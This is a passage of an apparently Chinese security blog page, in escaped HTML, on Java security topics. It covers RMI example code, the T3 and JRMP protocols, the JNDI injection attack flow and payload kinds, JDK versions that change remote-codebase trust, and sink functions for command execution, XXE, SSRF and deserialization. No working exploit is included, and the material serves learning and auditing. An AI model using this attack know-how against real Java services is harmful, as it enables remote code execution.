punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;40&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;41&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;42&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;catch&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;Throwable&lt;/span&gt; t&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;43&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            t&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;printStackTrace&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;44&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token class-name&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;45&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;46&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;47&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; args &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;48&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;// new object server&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;49&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token class-name&#34;&gt;PersonServer&lt;/span&gt; person &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;PersonServer&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Richard&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;34&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;50&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token class-name&#34;&gt;Person_Skeleton&lt;/span&gt; skel &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Person_Skeleton&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;person&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;51&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        skel&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;52&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;53&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;client实现&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#client实现&#34;&gt;#&lt;/a&gt; Client 实现&lt;/h3&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;figcaption data-lang=&#34;java&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;PersonClient&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; args&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;try&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token class-name&#34;&gt;Person&lt;/span&gt; person &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Person_Stub&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; age &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; person&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getAge&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; name &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; person&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token class-name&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;out&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;println&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;name &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34; is &#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; age &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34; years old&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;catch&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;Throwable&lt;/span&gt; t&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            t&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;printStackTrace&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;t3协议&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#t3协议&#34;&gt;#&lt;/a&gt; T3 协议&lt;/h2&gt;
&lt;p&gt;T3 协议是用于在 WebLogic 服务器和其他类型的 Java 程序之间传输信息的协议，是 Weblogic 对 RMI 规范的实现。简单来说，可以把 T3 视为暴露 JDNI 给用户调用的接口。&lt;/p&gt;
&lt;h2 id=&#34;jrmp&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#jrmp&#34;&gt;#&lt;/a&gt; JRMP&lt;/h2&gt;
&lt;p&gt;Java 远程方法协议 (Java Remote Method Protocol，JRMP) 是特定于 Java 技术的、用于查找和引用远程对象的协议。这是运行在 Java 远程方法调用 (RMI) 之下、TCP/IP 之上的线路层协议。&lt;/p&gt;
&lt;p&gt;JRMP 是一个 Java 特有的、适用于 Java 之间远程调用的基于流的协议，要求客户端和服务器上都使用 Java 对象。&lt;/p&gt;
&lt;h1 id=&#34;jndi&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#jndi&#34;&gt;#&lt;/a&gt; JNDI&lt;/h1&gt;
&lt;h2 id=&#34;简介-12&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介-12&#34;&gt;#&lt;/a&gt; 简介&lt;/h2&gt;
&lt;p&gt;JNDI (Java Naming and Directory Interface，Java 命名和目录接口) 是为 Java 应用程序提供命名和目录访问服务的 API，允许客户端通过名称发现和查找数据、对象，用于提供基于配置的动态调用。这些对象可以存储在不同的命名或目录服务中，例如 RMI、CORBA、LDAP、DNS 等。&lt;/p&gt;
&lt;p&gt;其中 Naming Service 类似于哈希表的 K/V 对，通过名称去获取对应的服务。Directory Service 是一种特殊的 Naming Service，用类似目录的方式来存取服务。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/11/27/e7VaR9mvNITk6U1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;jndi注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#jndi注入&#34;&gt;#&lt;/a&gt; JNDI 注入&lt;/h2&gt;
&lt;p&gt;JNDI 注入是 2016 年由 pentester 在 BlackHat USA 上的  &lt;code&gt;A Journey From JNDI LDAP Manipulation To RCE&lt;/code&gt;  议题提出的。&lt;/p&gt;
&lt;p&gt;其攻击过程如下&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;攻击者将 Payload 绑定到攻击者的命名 / 目录服务中&lt;/li&gt;
&lt;li&gt;攻击者将绝对 URL 注入易受攻击的 JNDI 查找方法&lt;/li&gt;
&lt;li&gt;应用程序执行查找&lt;/li&gt;
&lt;li&gt;应用程序连接到攻击者控制的 JNDI 服务并返回 Payload&lt;/li&gt;
&lt;li&gt;应用程序解码响应并触发有效负载&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;攻击载荷&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#攻击载荷&#34;&gt;#&lt;/a&gt; 攻击载荷&lt;/h2&gt;
&lt;p&gt;JDNI 主要有几种攻击载荷：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;CORBA&lt;/li&gt;
&lt;li&gt;IOR&lt;/li&gt;
&lt;li&gt;JNDI Reference&lt;/li&gt;
&lt;li&gt;LDAP&lt;/li&gt;
&lt;li&gt;Remote Location&lt;/li&gt;
&lt;li&gt;Remote Object&lt;/li&gt;
&lt;li&gt;RMI&lt;/li&gt;
&lt;li&gt;Serialized Object&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;rmi-remote-object&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#rmi-remote-object&#34;&gt;#&lt;/a&gt; RMI Remote Object&lt;/h3&gt;
&lt;p&gt;攻击者实现一个 RMI 恶意远程对象并绑定到 RMI Registry 上，将编译后的 RMI 远程对象类放在 HTTP/FTP/SMB 等服务器上。其中 Codebase 地址由远程服务器的  &lt;code&gt;java.rmi.server.codebase&lt;/code&gt;  属性设置，供受害者的 RMI 客户端远程加载。&lt;/p&gt;
&lt;p&gt;利用条件如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;RMI 客户端的上下文环境允许访问远程 Codebase。&lt;/li&gt;
&lt;li&gt;属性  &lt;code&gt;java.rmi.server.useCodebaseOnly&lt;/code&gt;  的值为 false。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;其中 JDK 6u45、7u21 后， &lt;code&gt;java.rmi.server.useCodebaseOnly&lt;/code&gt;  的值默认为 true。&lt;/p&gt;
&lt;h3 id=&#34;rmi-jndi-reference&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#rmi-jndi-reference&#34;&gt;#&lt;/a&gt; RMI + JNDI Reference&lt;/h3&gt;
&lt;p&gt;攻击者通过 RMI 服务返回一个 JNDI Naming Reference，受害者解码 Reference 时会去攻击者指定的远程地址加载 Factory 类。这种方式原理上并非使用 RMI Class Loading 机制，因此不受  &lt;code&gt;java.rmi.server.useCodebaseOnly&lt;/code&gt;  系统属性的限制。但是在 JDK 6u132, JDK 7u122, JDK 8u113 后限制了 Naming/Directory 服务中 JNDI Reference 远程加载 Object Factory 类的特性。系统属性  &lt;code&gt;com.sun.jndi.rmi.object.trustURLCodebase&lt;/code&gt;  、  &lt;code&gt;com.sun.jndi.cosnaming.object.trustURLCodebase&lt;/code&gt;  的默认值变为 false，即默认不允许从远程的 Codebase 加载 Reference 工厂类。&lt;/p&gt;
&lt;h3 id=&#34;ldap-jndi-reference&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ldap-jndi-reference&#34;&gt;#&lt;/a&gt; LDAP + JNDI Reference&lt;/h3&gt;
&lt;p&gt;Java 的 LDAP 可以在属性值中存储特定的 Java 对象，且 LDAP 服务的 Reference 远程加载 Factory 类不受  &lt;code&gt;com.sun.jndi.rmi.object.trustURLCodebase&lt;/code&gt;  、 &lt;code&gt;com.sun.jndi.cosnaming.object.trustURLCodebase&lt;/code&gt;  等属性的限制，适用范围更广。&lt;/p&gt;
&lt;h1 id=&#34;jdk-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#jdk-2&#34;&gt;#&lt;/a&gt; JDK&lt;/h1&gt;
&lt;h2 id=&#34;jdk-8&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#jdk-8&#34;&gt;#&lt;/a&gt; JDK 8&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;sun.net.www.protocol&lt;/code&gt;  不再支持 gopher 协议&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;8u251&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#8u251&#34;&gt;#&lt;/a&gt; 8u251&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;com.sun.org.apache.bcel.internal.util.ClassLoader 类被删除&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;8u191&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#8u191&#34;&gt;#&lt;/a&gt; 8u191&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;LDAP 远程 Reference 代码默认不信任，影响 LDAP 远程 Reference 代码攻击方式&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;8u121&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#8u121&#34;&gt;#&lt;/a&gt; 8u121&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;RMI 加入了反序列化白名单机制&lt;/li&gt;
&lt;li&gt;RMI 远程 Reference 代码默认不信任，影响 RMI 远程 Reference 代码攻击方式&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;8u113&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#8u113&#34;&gt;#&lt;/a&gt; 8u113&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;com.sun.jndi.rmi.object.trustURLCodebase&lt;/code&gt;  默认为 false&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.sun.jndi.cosnaming.object.trustURLCodebase&lt;/code&gt;  默认为 false&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;jdk-7&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#jdk-7&#34;&gt;#&lt;/a&gt; JDK 7&lt;/h2&gt;
&lt;h3 id=&#34;7u201&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#7u201&#34;&gt;#&lt;/a&gt; 7u201&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;LDAP 远程 Reference 代码默认不信任，影响 LDAP 远程 Reference 代码攻击方式&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;7u122&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#7u122&#34;&gt;#&lt;/a&gt; 7u122&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;com.sun.jndi.rmi.object.trustURLCodebase&lt;/code&gt;  默认为 false&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.sun.jndi.cosnaming.object.trustURLCodebase&lt;/code&gt;  默认为 false&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;7u40&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#7u40&#34;&gt;#&lt;/a&gt; 7u40&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;java.io.File&lt;/code&gt;  类中添加了  &lt;code&gt;isInvalid&lt;/code&gt;  方法，检测文件名中是否包含空字节&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;jdk-6&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#jdk-6&#34;&gt;#&lt;/a&gt; JDK 6&lt;/h2&gt;
&lt;h3 id=&#34;6u211&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#6u211&#34;&gt;#&lt;/a&gt; 6u211&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;LDAP 远程 Reference 代码默认不信任，影响 LDAP 远程 Reference 代码攻击方式&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;6u141&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#6u141&#34;&gt;#&lt;/a&gt; 6u141&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;com.sun.jndi.rmi.object.trustURLCodebase&lt;/code&gt;  默认为 false&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.sun.jndi.cosnaming.object.trustURLCodebase&lt;/code&gt;  默认为 false&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;6u45&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#6u45&#34;&gt;#&lt;/a&gt; 6u45&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;java.rmi.server.useCodebaseOnly 默认为 true，禁用自动加载远程类文件&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;常见sink&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见sink&#34;&gt;#&lt;/a&gt; 常见 Sink&lt;/h1&gt;
&lt;h2 id=&#34;命令执行注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#命令执行注入&#34;&gt;#&lt;/a&gt; 命令执行 / 注入&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;java.lang.Runtime.getRuntime().exec()&lt;/li&gt;
&lt;li&gt;java.lang.ProcessBuilder&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;xxe&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xxe&#34;&gt;#&lt;/a&gt; XXE&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;java.net.bull.javamelody.PayloadNameRequestWrapper&lt;/li&gt;
&lt;li&gt;javax.xml.bind.Unmarshaller&lt;/li&gt;
&lt;li&gt;javax.xml.parsers.DocumentBuilderFactory&lt;/li&gt;
&lt;li&gt;javax.xml.parsers.SAXParser&lt;/li&gt;
&lt;li&gt;javax.xml.stream.XMLStreamReader&lt;/li&gt;
&lt;li&gt;javax.xml.transform.sax.SAXSource&lt;/li&gt;
&lt;li&gt;javax.xml.transform.sax.SAXTransformerFactory&lt;/li&gt;
&lt;li&gt;javax.xml.transform.TransformerFactory&lt;/li&gt;
&lt;li&gt;javax.xml.validation.SchemaFactory&lt;/li&gt;
&lt;li&gt;javax.xml.validation.Validator&lt;/li&gt;
&lt;li&gt;javax.xml.xpath.XpathExpression&lt;/li&gt;
&lt;li&gt;org.apache.commons.digester3.Digester&lt;/li&gt;
&lt;li&gt;org.apache.ofbiz.base.util.UtilXml&lt;/li&gt;
&lt;li&gt;org.dom4j.io.SAXReader&lt;/li&gt;
&lt;li&gt;org.jdom.input.SAXBuilder&lt;/li&gt;
&lt;li&gt;org.jdom2.input.SAXBuilder&lt;/li&gt;
&lt;li&gt;org.xml.sax.helpers.XMLReaderFactory&lt;/li&gt;
&lt;li&gt;org.xml.sax.XMLReader&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;ssrf&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ssrf&#34;&gt;#&lt;/a&gt; SSRF&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;HttpClient.execute&lt;/li&gt;
&lt;li&gt;HttpClients.execute&lt;/li&gt;
&lt;li&gt;HttpURLConnection.getInputStream&lt;/li&gt;
&lt;li&gt;ImageIO.read&lt;/li&gt;
&lt;li&gt;OkHttpClient.newCall.execute&lt;/li&gt;
&lt;li&gt;Request.Get.execute&lt;/li&gt;
&lt;li&gt;Request.Post.execute&lt;/li&gt;
&lt;li&gt;URL.openStream&lt;/li&gt;
&lt;li&gt;URLConnection.getInputStream&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;反序列化-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#反序列化-2&#34;&gt;#&lt;/a&gt; 反序列化&lt;/h2&gt;
&lt;h3 id=&#34;相关sink函数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#相关sink函数&#34;&gt;#&lt;/a&gt; 相关 Sink 函数&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;JSON.parseObject&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ObjectInputStream.readObject&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ObjectInputStream.readUnshared&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ObjectMapper.readValue&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;XMLDecoder.readObject&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;XStream.fromXML&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Yaml.load&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;magic-call&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#magic-call&#34;&gt;#&lt;/a&gt; Magic Call&lt;/h3&gt;
&lt;p&gt;以下的魔术方法都会在反序列化过程中被自动的调用。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;readObject&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;readExternal&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;readResolve&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;readObjectNoData&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;validateObject&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;finalize&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
